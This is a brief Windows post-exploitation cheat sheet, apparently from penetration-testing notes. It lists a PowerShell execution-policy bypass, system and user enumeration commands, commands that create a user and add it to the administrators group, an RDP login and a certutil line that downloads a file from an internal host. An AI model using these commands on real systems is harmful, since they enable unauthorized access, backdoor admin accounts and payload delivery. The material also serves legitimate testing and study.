#### 1. Powershell
    . Bypass ExecutionPolicy (cannot be loaded because running scripts is disabled on this system)

    ```
    powershell -ep bypass
    ```

#### 2. CMD
    ```powershell
    whoami

    systeminfo

    net user

    net user username password /add <create new username with password>

    net localgroup administrators user /add <add user to administrator group>

    net localgroup administrators <list administrators>

    wmic useraccount get name,sid

    cd $env:USERPROFILE/DESKTOP

    certutil.exe https://lolbas-project.github.io/lolbas/Binaries/Certutil/
    ```

    ```
    xfreerdp /u:username /v:ip_address

    certutil.exe -urlcache  -f http://192.168.1.1:8000/filename outputfilename
    ```  
